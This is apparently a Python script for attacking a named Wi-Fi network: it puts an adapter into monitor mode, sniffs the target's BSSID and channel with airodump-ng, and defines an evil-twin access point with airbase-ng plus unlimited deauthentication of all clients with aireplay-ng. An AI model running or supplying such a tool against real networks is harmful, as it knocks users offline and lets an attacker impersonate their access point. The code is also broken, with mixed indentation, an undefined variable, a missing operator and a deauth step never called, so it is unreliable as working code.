#!/usr/bin/env python

import os
import subprocess
from time import sleep
from threading import Timer
import csv

def initial_setup(adapter):
    os.system("airmon-ng check kill")
    os.system("/etc/init.d/avahi-daemon stop")
    os.system("ifconfig %s down" %adapter)
    os.system("airmon-ng start %s" %adapter)
    cmd = "ifconfig | grep mon | awk -F: '{print $1}'"
    int_name = str(os.popen(cmd).read()).strip('\n')
    return int_name

# def network_teardown(int_name):
#     os.system("airmon-ng stop %s" %int_name)
#     os.system("service network-manager restart")

def kill(p):
    try:
        p.kill()
    except OSError:
        pass

def network_sniff(interface_name, essid):
    cmd = "airodump-ng -w tmpcap -o csv -N " + essid + " --write-interval 1 " + interface_name
    # os.spawnlp(os.P_WAIT, cmd)
    #os.system(cmd)
    p = subprocess.Popen("exec " + cmd, shell=True)
    t = Timer(10, kill, [p])
    t.start()
    p.wait()
    t.cancel()
    # extract bssid, channel
    bssid = str(os.popen("cat tmpcap-01.csv | grep " + essid + " | awk '{print $1}' | awk -F',' 'NR==1{print $1}'").read()).strip(',').strip('\n')
    channel = str(os.popen("cat tmpcap-01.csv | grep " + essid + " | awk '{print $6}' | awk -F',' 'NR==1{print $1}'").read()).strip(',').strip('\n')
    print("GOT BSSID AND CHANNEL\n")
    print("BSSID: " + bssid)
    print("CHANNEL: " + channel)
    return

def deauth_all_users(essid, bssid, channel, inter): 
	os.system("airbase-ng -a " + bssid + " --essid " + essid + " -c " + channel +" " + interface_name)
    os.system("aireplay-ng --deauth 0 -a " + bssid + " " + interface_name " --ignore-negative-one")

if __name__ == "__main__":

    os.system("rm tmpcap*")
    interface_name = input("Please enter your wireless interface name (e.g. wlan0) ")
    network_name = input("Please enter the target network name (case sensitive) ")
    int_name = initial_setup(interface_name)

    network_sniff(int_name, network_name)
    print("Done")
